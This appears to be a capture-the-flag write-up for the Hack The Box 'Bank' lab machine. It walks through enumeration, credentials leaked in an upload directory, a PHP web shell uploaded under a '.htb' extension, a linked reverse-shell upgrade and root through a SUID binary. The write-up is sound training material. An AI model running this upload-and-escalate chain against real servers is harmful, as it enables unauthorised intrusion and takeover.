# HTB Bank – Penetration Test Report

## Enumeration

### Open Ports

| Port   | State | Service | Version                                                        |
| ------ | ----- | ------- | -------------------------------------------------------------- |
| 22/tcp | open  | SSH     | OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) |
| 53/tcp | open  | DNS     | ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)                      |
| 80/tcp | open  | HTTP    | Apache httpd 2.4.7 ((Ubuntu))                                  |

### Web Enumeration

* **Default Webpage**: Apache2 Ubuntu Default Page
* **DNS**: ISC BIND 9.9.5 is running (outdated and potentially vulnerable)

  * No reverse zone
* **Dirb scan**: No useful results

#### Scanning `http://10.129.29.200/`

* ✅ `http://10.129.29.200/index.html` – 200 OK, 11.5 KB
* ❌ `http://10.129.29.200/server-status` – 403 Forbidden

### VHost Enumeration

```bash
gobuster vhost -u http://10.129.29.200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -H "Host: FUZZ.bank.htb"
```

* No vhosts found at first, but afterwards a login page was shown instead of the default Apache page.

### Directory Scan on `bank.htb`

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://bank.htb
```

* `/uploads` → 301
* `/assets` → 301
* `/inc` → 301
* `/server-status` → 403
* `/balance-transfer` → 301

### Sensitive File in `/balance-transfer`

* Found multiple files
* One file had a much smaller size

```
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

* These credentials work for logging in on the webpage

---

## Exploitation

* Support page allows file uploads
* Uploads are accessible publicly
* Only image files are allowed, but...

> In the HTML source:
>
> ```html
> <!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
> ```

### Exploiting File Upload

* Upload `shell.htb` containing PHP code

Access shell:

```http
http://bank.htb/uploads/shell.htb?cmd=id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

http://bank.htb/uploads/shell.htb?cmd=cat%20/home/chris/user.txt
```

### Reverse Shell

1. Upload [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
2. Upgrade shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

* `whoami`: `www-data`
* `sudo -l`: password required

### Check Crontab

```bash
cat /etc/crontab
```

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user    command
17 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6   * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6   * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6   1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

### SUID Binary Check

```bash
find / -perm -4000 -type f -exec ls -l {} + 2>/dev/null
```

Found:

```
-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
```

* Running this binary gives a root shell

```bash
cat /root/root.txt
```
